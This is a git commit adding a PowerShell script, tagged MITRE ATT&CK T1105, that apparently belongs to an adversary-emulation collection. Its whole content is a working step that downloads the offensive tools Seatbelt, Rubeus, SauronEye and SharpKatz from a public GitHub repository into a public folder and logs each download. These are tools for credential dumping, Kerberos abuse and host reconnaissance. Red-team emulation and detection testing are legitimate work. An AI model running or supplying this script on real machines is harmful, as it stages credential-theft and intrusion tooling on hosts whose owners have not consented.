e8fdb6dc2f6b8d7e88ab0152cbefab8bd2c5070e
Jim Benna <jim.benna@gmail.com>
2025-06-24 18:47:47 +0200

    Script to download several Compiled attack tools

---
+++ Command-And-Control/Downloads several compiled attack tool.ps1
@@ -0,0 +1,19 @@
+# Downloads several compiled attack tools
+# Technic ID : T1105
+Clear-Host
+Write-Output "==============================================================================="
+Write-Output "Downloads several compiled attack tools (T1105)"
+Write-Output "==============================================================================="
+#
+$DownloadLogFile = "$env:PUBLIC\exf\Tools_Download.log";
+$DestinationPath = "$env:PUBLIC\Toolz\";
+$SoftToDownload = @("Seatbelt.exe","Rubeus.exe","SauronEye.exe","SharpKatz.exe");
+foreach ($Tool in $SoftToDownload) 
+{
+    Write-host $Tool;
+    $DownloadRun = "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/$Tool";
+    $DestinationFilename = "$DestinationPath$Tool";
+    $web = (New-Object System.Net.WebClient);
+    $result = $web.DownloadFile("$DownloadRun", "$DestinationFileName");
+    Write-Output "The file $Tool has been successfully downloaded from $DownloadRun and stored to $DestinationFilename" | Out-File -FilePath "$DownloadLogFile" -Append;
+  }
